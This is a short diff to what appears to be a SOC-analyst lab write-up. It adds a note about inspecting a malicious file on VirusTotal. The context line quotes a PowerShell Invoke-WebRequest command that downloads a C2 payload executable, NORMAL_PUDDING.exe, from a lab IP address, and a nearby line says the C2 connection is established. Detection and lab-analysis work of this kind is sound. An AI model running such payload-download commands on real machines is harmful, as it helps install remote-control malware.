@@ -34,6 +34,9 @@ IWR -Uri http://192.168.159.100/NORMAL_PUDDING.exe -Outfile C:\Users\hoang\Downl
 ![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/f34352b8-d9c6-4f33-a0d8-13837a7796bf)
 - In the network tab, we can see the C2 payload NORMAL_PUDDING is established
 ![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/e07f3d9a-3a6d-4aa1-aa01-064be6df2920)
+- In the file system tab, we can inspect the malicious file on VirusTotal
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/42e58ff3-2bde-47f2-94b6-5e2960a68315)
+
 
 
 
